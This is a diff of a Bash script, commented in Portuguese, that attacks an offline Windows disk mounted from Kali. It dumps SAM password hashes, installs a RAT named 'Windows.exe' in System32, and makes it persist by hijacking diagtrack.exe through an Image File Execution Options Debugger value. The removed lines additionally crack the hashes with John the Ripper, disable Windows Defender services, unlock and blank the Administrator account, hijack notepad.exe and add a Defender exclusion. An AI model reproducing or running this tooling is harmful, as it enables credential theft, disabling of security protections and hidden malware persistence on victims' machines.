@@ -1,68 +1,61 @@
 #!/bin/bash
 
 # --- CONFIGURAÇÕES ---
-# O nome e o caminho que o Windows usará internamente
 RAT_NAME="Windows.exe"
 RAT_PATH="C:\\Windows\\System32\\$RAT_NAME"
-WORDLIST="/usr/share/wordlists/rockyou.txt"
+# Caminho absoluto para evitar erros de variáveis vazias
+DEST_DIR="/home/kali/Desktop/Post_Exploitation"
+mkdir -p "$DEST_DIR"
 
-echo "[+] Iniciando Processo de Automação (Modo Direto)..."
+echo "[+] Iniciando Automação ProMax (Modo Global - Forçado)..."
 
-# 1. LOCALIZAR ONDE VOCÊ MONTOU O DISCO
-# O script procura pela pasta Windows dentro do seu ponto de montagem no Kali
-MOUNT_POINT=$(find /run/media/kali -maxdepth 3 -name "Windows" -type d 2>/dev/null | sed 's/\/Windows//' | head -n 1)
+# 1. GERENCIAMENTO DE DISCO (FORÇADO)
+# Identifica a partição do Windows (procurando pelo maior disco NTFS se necessário)
+DRIVE=$(lsblk -pno NAME,FSTYPE | grep -i ntfs | awk '{print $1}' | head -n 1)
+[ -z "$DRIVE" ] && DRIVE="/dev/sda4" # Fallback para o seu sda4
 
-if [ -z "$MOUNT_POINT" ]; then
-    echo "[-] Erro: Não encontrei o Windows montado em /run/media/kali/."
-    echo "[!] Certifique-se de que você abriu a pasta do disco no gerenciador de arquivos (Thunar/Nautilus)."
-    exit 1
+echo "[+] Alvo detectado: $DRIVE"
+sudo umount "$DRIVE" 2>/dev/null
+
+# Tenta montar ignorando explicitamente o arquivo de hibernação
+mkdir -p /mnt/win_disk
+sudo mount -t ntfs-3g -o remove_hiberfile "$DRIVE" /mnt/win_disk 2>/dev/null
+
+# Se falhar, tentamos o modo 'ro' (Read-Only) que é suficiente para extrair hashes
+if [ ! -f "/mnt/win_disk/Windows/System32/ntoskrnl.exe" ]; then
+    echo "[!] Falha na montagem RW, tentando modo Read-Only para extração..."
+    sudo mount -t ntfs-3g -o ro "$DRIVE" /mnt/win_disk
 fi
 
-echo "[+] Windows detectado em: $MOUNT_POINT"
-
-# 2. DEFINIR CAMINHOS DAS COLMEIAS (HIVES)
+MOUNT_POINT="/mnt/win_disk"
 SOFTWARE="$MOUNT_POINT/Windows/System32/config/SOFTWARE"
 SYSTEM="$MOUNT_POINT/Windows/System32/config/SYSTEM"
 SAM="$MOUNT_POINT/Windows/System32/config/SAM"
-DEST_DIR="$HOME/Desktop/Post_Exploitation"
-mkdir -p "$DEST_DIR"
 
-# 3. TRATAR WORDLIST (ROCKYOU)
-if [ ! -f "$WORDLIST" ]; then
-    echo "[!] Descompactando RockYou para o ataque de dicionário..."
-    sudo gunzip -c /usr/share/wordlists/rockyou.txt.gz > "$HOME/rockyou.txt"
-    WORDLIST="$HOME/rockyou.txt"
+# 2. EXTRAÇÃO DE HASHES
+echo "[+] Extraindo Hashes..."
+if sudo samdump2 "$SYSTEM" "$SAM" > "$DEST_DIR/hashes.txt"; then
+    echo "[!] SUCESSO: Hashes salvos em $DEST_DIR/hashes.txt"
+    # Mostra na tela para conferência imediata
+    cat "$DEST_DIR/hashes.txt"
+else
+    echo "[#] ERRO: Falha crítica na extração de hashes."
 fi
 
-# 4. EXTRAÇÃO E ATAQUE HÍBRIDO (JOHN)
-echo "[+] Extraindo Hashes..."
-sudo samdump2 "$SYSTEM" "$SAM" > "$DEST_DIR/hashes.txt"
+# 3. PERSISTÊNCIA (IFEO DIAGTRACK)
+# Só tentamos se o disco estiver montado com escrita
+if mount | grep "$MOUNT_POINT" | grep -q "rw"; then
+    echo "[+] Aplicando persistência via DiagTrack..."
+    printf "cd Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\nnk diagtrack.exe\ncd diagtrack.exe\nnv 1 Debugger\ned Debugger\n$RAT_PATH\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null
+    
+    # Injeção do seu binário C++
+    if [ -f "./$RAT_NAME" ]; then
+        sudo cp "./$RAT_NAME" "$MOUNT_POINT/Windows/System32/"
+        echo "[+] Binário $RAT_NAME implantado."
+    fi
+else
+    echo "[!] AVISO: Disco em modo Read-Only. Não foi possível injetar o IFEO."
+fi
 
-echo "[+] ETAPA 1: Ataque de Dicionário (RockYou)..."
-john --format=nt --wordlist="$WORDLIST" "$DEST_DIR/hashes.txt"
-
-echo "[+] ETAPA 2: Iniciando Força Bruta (Incremental) em Background..."
-john --format=nt --incremental "$DEST_DIR/hashes.txt" &
-
-# 5. INJEÇÃO DE COMANDOS NAS COLMEIAS
-echo "[+] Injetando modificações no Registro..."
-
-# A) SAM: Ativar Admin (01f4), Limpar Senha (1) e Desbloquear (2)
-printf "1\n01f4\n1\n2\nq\nq\ny\n" | sudo chntpw -i "$SAM" > /dev/null
-
-# B) SYSTEM: Desativar WinDefend e Filtros (Start=4)
-printf "cd ControlSet001\\Services\\WinDefend\ned Start\n4\ncd ..\\WdFilter\ned Start\n4\ncd ..\\WdNisSvc\ned Start\n4\nq\ny\n" | sudo chntpw -e "$SYSTEM" > /dev/null
-
-# C) SOFTWARE: Sequestrar o Notepad.exe usando o seu RAT na System32
-printf "cd Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\nnk notepad.exe\ncd notepad.exe\nnv 1 Debugger\ned Debugger\n$RAT_PATH\nq\ny\n" | sudo chntpw -e "$SOFTWARE" > /dev/null
-
-# D) SOFTWARE: Adicionar Exclusão de caminho no Defender
-printf "cd Microsoft\\Windows Defender\\Exclusions\\Paths\nnv 4 $RAT_PATH\ned $RAT_PATH\n0\nq\ny\n" | sudo chntpw -e "$SOFTWARE" > /dev/null
-
-# 6. FINALIZAÇÃO
 echo "--------------------------------------------------"
-echo "[!] OPERAÇÃO CONCLUÍDA COM SUCESSO!"
-echo "[*] As senhas descobertas aparecerão abaixo:"
-john --show --format=nt "$DEST_DIR/hashes.txt"
-echo "--------------------------------------------------"
-echo "[+] Script finalizado. Lembre-se de copiar seu $RAT_NAME para a System32 do Windows antes de reiniciar!"
+echo "[!] PROCESSO FINALIZADO."
